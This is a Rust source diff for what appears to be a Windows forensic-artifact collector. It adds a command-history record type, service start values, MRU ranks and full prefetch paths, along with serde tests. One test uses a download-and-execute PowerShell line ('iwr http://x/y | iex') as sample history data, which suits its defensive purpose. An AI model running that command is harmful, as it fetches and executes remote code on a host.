@@ -22,6 +22,9 @@ pub enum Record {
     RegValue(RegValueRecord),
     Execution(ExecutionRecord),
     LogonSession(LogonSessionRecord),
+    /// One line of a shell's command history (PSReadLine `ConsoleHost_history.txt`).
+    /// Additive variant (phase 2B).
+    CommandHistory(CommandHistoryRecord),
 }
 
 /// EVTX event normalized to JSON-ish fields (Stage 1 primary input).
@@ -214,6 +217,12 @@ pub struct PersistenceRecord {
     /// consumer. `None` for every other mechanism. Additive; omitted when None.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub bound: Option<bool>,
+    /// Service `Start` value (registry DWORD) for `Mechanism::Service` records:
+    /// 0 boot, 1 system, 2 auto, 3 demand (manual). Disabled (4) services are not
+    /// emitted. None for every other mechanism. Additive (phase 2B): lets analyzers
+    /// weigh a demand-start service lower than an autostart one.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub service_start: Option<u32>,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -223,6 +232,11 @@ pub struct RegValueRecord {
     pub value: String,
     pub data: String,
     pub last_write: Option<DateTime<Utc>>,
+    /// Position in a most-recently-used list (RunMRU `MRUList`, TypedPaths `urlN`):
+    /// 0 = most recent. The key's LastWrite only dates the rank-0 entry. None when the
+    /// value is not part of an MRU list or its rank is unknown. Additive (phase 2B).
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub mru_rank: Option<u32>,
 }
 
 /// Evidence-of-execution (currently Prefetch).
@@ -237,6 +251,28 @@ pub struct ExecutionRecord {
     pub user_sid: Option<String>,
     /// Whether the source proves execution (not just presence).
     pub execution_confirmed: Option<bool>,
+    /// The executable's full path as the artifact recorded it, verbatim (prefetch:
+    /// the NT volume form `\VOLUME{...}\WINDOWS\SYSTEM32\X.EXE` from the
+    /// filename-strings section). `path` holds the drive-letter form when the volume
+    /// could be mapped, else the bare name. Additive (phase 2B).
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub full_path: Option<String>,
+}
+
+/// One command-history line from a user's shell history file (PSReadLine
+/// `ConsoleHost_history.txt`). Collected read-only; only the tail of each file is kept.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct CommandHistoryRecord {
+    /// Profile folder name the history belongs to (e.g. `alice` for `C:\Users\alice`).
+    pub user: String,
+    /// Full path of the history file.
+    pub path: String,
+    /// 1-based physical line number within the file.
+    pub line_no: u64,
+    pub command: String,
+    /// The history file's mtime: when its LAST line was written (earlier lines are older).
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub last_write: Option<DateTime<Utc>>,
 }
 
 /// A live logon session (LSA/WTS enumeration). "Who is using the host right now."
@@ -283,6 +319,7 @@ mod tests {
             last_write: None,
             bound: None,
             signer_source: None,
+            service_start: None,
         };
         let j = serde_json::to_string(&r).unwrap();
         assert!(j.contains(r#""signer":"Docker Inc""#));
@@ -386,6 +423,7 @@ mod tests {
             sha1: None,
             user_sid: None,
             execution_confirmed: Some(false),
+            full_path: None,
         });
         let json = serde_json::to_string(&rec).unwrap();
         assert!(json.contains("\"kind\":\"execution\""));
@@ -405,6 +443,52 @@ mod tests {
         );
         let unknown: Mechanism = serde_json::from_str("\"brand_new_thing\"").unwrap();
         assert_eq!(unknown, Mechanism::Other);
+    }
+
+    /// Phase 2B additive fields are omitted when None and default on old JSON.
+    #[test]
+    fn phase2b_additive_fields_skip_when_none_and_default_on_old_json() {
+        let old = r#"{"kind":"reg_value","hive":"HKCU","key":"k","value":"a","data":"d","last_write":null}"#;
+        let Record::RegValue(rv) = serde_json::from_str::<Record>(old).unwrap() else {
+            panic!("expected RegValue");
+        };
+        assert_eq!(rv.mru_rank, None);
+        let j = serde_json::to_string(&Record::RegValue(rv.clone())).unwrap();
+        assert!(!j.contains("mru_rank"), "{j}");
+        let ranked = RegValueRecord {
+            mru_rank: Some(0),
+            ..rv
+        };
+        assert!(serde_json::to_string(&ranked)
+            .unwrap()
+            .contains(r#""mru_rank":0"#));
+
+        let old_p = r#"{"mechanism":"service","location":"l","value":null,"command":null,"binary_path":null,"binary_sha256":null,"signed":null,"signer":null,"last_write":null}"#;
+        let p: PersistenceRecord = serde_json::from_str(old_p).unwrap();
+        assert_eq!(p.service_start, None);
+        assert!(!serde_json::to_string(&p).unwrap().contains("service_start"));
+
+        let old_e = r#"{"kind":"execution","source":"prefetch","path":"X.EXE","first_run":null,"last_run":null,"run_count":1,"sha1":null,"user_sid":null,"execution_confirmed":true}"#;
+        let Record::Execution(e) = serde_json::from_str::<Record>(old_e).unwrap() else {
+            panic!("expected Execution");
+        };
+        assert_eq!(e.full_path, None);
+    }
+
+    #[test]
+    fn command_history_record_kind_tag_round_trips() {
+        let rec = Record::CommandHistory(CommandHistoryRecord {
+            user: "alice".into(),
+            path: r"C:\Users\alice\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt".into(),
+            line_no: 42,
+            command: "iwr http://x/y | iex".into(),
+            last_write: None,
+        });
+        let json = serde_json::to_string(&rec).unwrap();
+        assert!(json.contains(r#""kind":"command_history""#), "{json}");
+        assert!(!json.contains("last_write"), "{json}");
+        let back: Record = serde_json::from_str(&json).unwrap();
+        assert_eq!(serde_json::to_string(&back).unwrap(), json);
     }
 
     #[test]
